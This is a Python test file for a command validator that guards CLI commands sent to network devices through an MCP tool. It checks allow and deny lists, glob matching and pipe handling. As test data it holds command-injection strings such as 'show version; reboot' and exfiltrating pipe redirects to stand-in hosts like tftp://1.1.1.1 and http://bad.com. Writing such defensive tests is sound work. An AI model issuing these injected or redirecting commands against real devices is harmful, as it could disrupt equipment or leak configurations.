import re
from typing import Any
from unittest.mock import patch

from netmiko_mcp.security import (
    _build_unsafe_re_class,
    _to_regex_char,
    glob_to_regex,
    validate_command,
)


# ---------------------------------------------------------------------------
# _to_regex_char
# ---------------------------------------------------------------------------


def test_to_regex_char_newline() -> None:
    """Newline must be converted to its escaped form for use inside a regex class."""
    assert _to_regex_char("\n") == "\\n"


def test_to_regex_char_carriage_return() -> None:
    """Carriage return must be converted to its escaped form."""
    assert _to_regex_char("\r") == "\\r"


def test_to_regex_char_semicolon() -> None:
    """Semicolon is printable and must pass through unchanged."""
    assert _to_regex_char(";") == ";"


def test_to_regex_char_ampersand() -> None:
    """Ampersand is printable and must pass through unchanged."""
    assert _to_regex_char("&") == "&"


def test_to_regex_char_printable_passthrough() -> None:
    """Arbitrary printable characters must pass through unchanged."""
    for c in ("a", "Z", "|", " ", "0", "-"):
        assert _to_regex_char(c) == c


# ---------------------------------------------------------------------------
# _build_unsafe_re_class
# ---------------------------------------------------------------------------


def test_build_unsafe_re_class_default_string() -> None:
    """Default unsafe chars must produce the exact expected character class string."""
    result = _build_unsafe_re_class([";", "\n", "\r", "&"])
    assert result == "[^;\\n\\r&]"


def test_build_unsafe_re_class_blocks_default_chars() -> None:
    """The compiled class must reject each of the four default unsafe characters."""
    pattern = re.compile(_build_unsafe_re_class([";", "\n", "\r", "&"]))
    for unsafe in (";", "\n", "\r", "&"):
        assert not pattern.fullmatch(unsafe), f"Expected {unsafe!r} to be blocked"


def test_build_unsafe_re_class_allows_safe_chars() -> None:
    """The compiled class must accept characters that are not in the unsafe list."""
    pattern = re.compile(_build_unsafe_re_class([";", "\n", "\r", "&"]))
    for safe in ("a", "Z", "0", " ", "-", "|", ".", "/"):
        assert pattern.fullmatch(safe), f"Expected {safe!r} to be allowed"


def test_build_unsafe_re_class_custom_chars() -> None:
    """Additional chars beyond the defaults must also be blocked when added."""
    pattern = re.compile(_build_unsafe_re_class([";", "\n", "\r", "&", "|"]))
    assert not pattern.fullmatch("|")
    assert pattern.fullmatch("a")


def test_build_unsafe_re_class_blocks_within_string() -> None:
    """Unsafe chars embedded inside a longer string must prevent a full match."""
    pattern = re.compile(_build_unsafe_re_class([";", "\n", "\r", "&"]) + "*")
    assert pattern.fullmatch("show ip interface brief")
    assert not pattern.fullmatch("show ip interface brief; reboot")
    assert not pattern.fullmatch("show ip interface brief\nreboot")
    assert not pattern.fullmatch("show ip interface brief & reboot")


# ---------------------------------------------------------------------------
# glob_to_regex
# ---------------------------------------------------------------------------


def test_glob_to_regex_exact_match() -> None:
    """A pattern with no wildcard must match only the exact string."""
    p = glob_to_regex("show version")
    assert p.match("show version")
    assert not p.match("show version extra")
    assert not p.match("show versio")
    assert not p.match("")


def test_glob_to_regex_trailing_wildcard_matches_arguments() -> None:
    """'show *' must match 'show' with any safe arguments."""
    p = glob_to_regex("show *")
    assert p.match("show version")
    assert p.match("show ip interface brief")
    assert p.match("show bgp summary")


def test_glob_to_regex_trailing_wildcard_matches_bare_command() -> None:
    """'show *' must also match 'show' with no arguments (the group is optional)."""
    p = glob_to_regex("show *")
    assert p.match("show")


def test_glob_to_regex_is_case_insensitive() -> None:
    """Patterns must match regardless of capitalisation."""
    p = glob_to_regex("show version")
    assert p.match("Show Version")
    assert p.match("SHOW VERSION")


def test_glob_to_regex_strips_leading_trailing_whitespace() -> None:
    """Leading/trailing whitespace in the pattern must be ignored."""
    p = glob_to_regex("  show version  ")
    assert p.match("show version")


def test_glob_to_regex_mid_pattern_wildcard() -> None:
    """A wildcard in the middle of a pattern must match safely."""
    p = glob_to_regex("show ip *")
    assert p.match("show ip interface brief")
    assert p.match("show ip route")
    assert not p.match("show version")


# --- bypass attempts --------------------------------------------------------


def test_glob_to_regex_wildcard_cannot_match_semicolon() -> None:
    """The '*' wildcard must never expand across a semicolon."""
    p = glob_to_regex("show *")
    assert not p.match("show version; reboot")
    assert not p.match("show version;reboot")


def test_glob_to_regex_wildcard_cannot_match_newline() -> None:
    """The '*' wildcard must never expand across a newline."""
    p = glob_to_regex("show *")
    assert not p.match("show version\nreboot")


def test_glob_to_regex_wildcard_cannot_match_carriage_return() -> None:
    """The '*' wildcard must never expand across a carriage return."""
    p = glob_to_regex("show *")
    assert not p.match("show version\rreboot")


def test_glob_to_regex_wildcard_cannot_match_ampersand() -> None:
    """The '*' wildcard must never expand across an ampersand."""
    p = glob_to_regex("show *")
    assert not p.match("show version && reboot")
    assert not p.match("show version &")


def test_glob_to_regex_regex_special_chars_in_pattern_are_neutralised() -> None:
    """Regex special characters in the literal part of a pattern must be treated
    as plain text, not as regex operators."""
    p = glob_to_regex("show version (detail)")
    assert p.match("show version (detail)")
    assert not p.match("show version Xdetail)")


def test_glob_to_regex_wildcard_does_not_match_empty_with_mandatory_prefix() -> None:
    """A pattern like 'show *' must not match an unrelated command."""
    p = glob_to_regex("show *")
    assert not p.match("configure terminal")
    assert not p.match("debug ip packet")


# --- block_unsafe=False (deny check mode) -----------------------------------


def test_glob_to_regex_block_unsafe_false_matches_unsafe_chars() -> None:
    """With block_unsafe=False the wildcard must match unsafe characters."""
    p = glob_to_regex("reload *", block_unsafe=False)
    assert p.match("reload in 5")
    assert p.match("reload cancel")


def test_glob_to_regex_block_unsafe_false_wildcard_broader_than_default() -> None:
    """block_unsafe=False must match strings that block_unsafe=True would reject."""
    blocked = glob_to_regex("reload *", block_unsafe=True)
    broad = glob_to_regex("reload *", block_unsafe=False)
    # Default (block_unsafe=True) rejects a command containing a semicolon
    assert not blocked.match("reload ;bad")
    # Deny mode (block_unsafe=False) matches it
    assert broad.match("reload ;bad")


def test_glob_to_regex_block_unsafe_false_exact_pattern_unchanged() -> None:
    """block_unsafe=False must not affect exact patterns (no wildcard)."""
    p = glob_to_regex("reload", block_unsafe=False)
    assert p.match("reload")
    assert not p.match("reload in 5")
    assert not p.match("show version")


@patch("netmiko_mcp.security.load_commands")
def test_validate_command_default_allowed(mock_load: Any) -> None:
    """Test that default behavior strictly denies everything if no YAML is loaded."""
    mock_load.return_value = {}  # Simulate missing or empty YAML
    assert validate_command("show ip int brief") is False
    assert validate_command("show version") is False


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_commands")
def test_validate_command_default_denied(mock_load: Any, mock_settings: Any) -> None:
    """Test that commands are denied by default when no whitelist is configured."""
    mock_load.return_value = {}  # Simulate missing or empty commands file
    mock_settings.allow_pipe = False
    mock_settings.unsafe_chars = [";", "\n", "\r", "&"]

    # Pipes are blocked when allow_pipe is False
    assert validate_command("show run | include password") is False
    # Nothing is allowed without a whitelist
    assert validate_command("clear ip ospf process") is False
    assert validate_command("debug ip packet") is False


@patch("netmiko_mcp.security.load_commands")
def test_validate_command_custom_yaml(mock_load: Any) -> None:
    """Test that an external YAML config overrides the defaults."""
    mock_load.return_value = {
        "allowed_commands": ["display interface brief", "show version"],
        "denied_commands": ["reboot"],
    }

    # Defaults should now fail (if they aren't explicitly in the custom config)
    assert validate_command("show ip int brief") is False

    # Custom allowed should pass
    assert validate_command("display interface brief") is True

    # Custom denied should fail
    assert validate_command("display interface brief reboot") is False


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_commands")
def test_validate_command_pipes_disabled(mock_load: Any, mock_settings: Any) -> None:
    """Test that pipes are rejected when allow_pipe is False."""
    mock_settings.allow_pipe = False
    mock_settings.unsafe_chars = [";", "\n", "\r", "&"]
    mock_settings.pipe_modifiers = ["include", "exclude", "section", "begin", "count"]
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Base command passes
    assert validate_command("show version") is True
    # Piped command fails
    assert validate_command("show version | include uptime") is False


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_commands")
def test_validate_command_pipes_enabled_safe(mock_load: Any, mock_settings: Any) -> None:
    """Test that safe pipes are permitted when allow_pipe is True."""
    mock_settings.allow_pipe = True
    mock_settings.unsafe_chars = [";", "\n", "\r", "&"]
    # Simulate a user who has added IOS and NX-OS modifiers to their config
    mock_settings.pipe_modifiers = [
        "include",
        "exclude",
        "section",
        "begin",
        "count",
        "grep",
        "egrep",
        "head",
        "last",
        "less",
        "no-more",
        "sort",
        "uniq",
        "wc",
        "json",
        "json-pretty",
        "xml",
        "xmlin",
        "xmlout",
        "human",
        "end",
        "nz",
    ]
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Default IOS/IOS-XE modifiers
    assert validate_command("show version | include uptime") is True
    assert validate_command("show version | exclude test") is True
    assert validate_command("show version | section ospf") is True
    assert validate_command("show version | begin router") is True
    assert validate_command("show version | count") is True

    # NX-OS formatting pipes
    assert validate_command("show version | json") is True
    assert validate_command("show version | json-pretty") is True
    assert validate_command("show version | xml") is True
    assert validate_command("show version | human") is True

    # NX-OS textual pipes
    assert validate_command("show version | grep test") is True
    assert validate_command("show version | egrep test") is True
    assert validate_command("show version | head 5") is True
    assert validate_command("show version | last 5") is True
    assert validate_command("show version | sort") is True
    assert validate_command("show version | uniq") is True
    assert validate_command("show version | wc") is True
    assert validate_command("show version | end test") is True
    assert validate_command("show version | nz") is True


@patch("netmiko_mcp.security.settings")
@patch("netmiko_mcp.security.load_commands")
def test_validate_command_pipes_enabled_dangerous(mock_load: Any, mock_settings: Any) -> None:
    """Test that dangerous pipes are rejected even when allow_pipe is True."""
    mock_settings.allow_pipe = True
    mock_settings.unsafe_chars = [";", "\n", "\r", "&"]
    mock_settings.pipe_modifiers = ["include", "exclude", "section", "begin", "count"]
    mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}

    # Dangerous redirects
    assert validate_command("show version | redirect tftp://1.1.1.1/test") is False
    assert validate_command("show version | append flash:test.txt") is False
    assert validate_command("show version | tee http://bad.com") is False

    # Dangerous shell escapes and manipulations (NX-OS)
    assert validate_command("show version | awk '{print $1}'") is False
    assert validate_command("show version | sed 's/a/b/'") is False
    assert validate_command("show version | cut -d' ' -f1") is False
    assert validate_command("show version | tr a b") is False
    assert validate_command("show version | vsh") is False
    assert validate_command("show version | email test@test.com") is False
    assert validate_command("show version | diff") is False
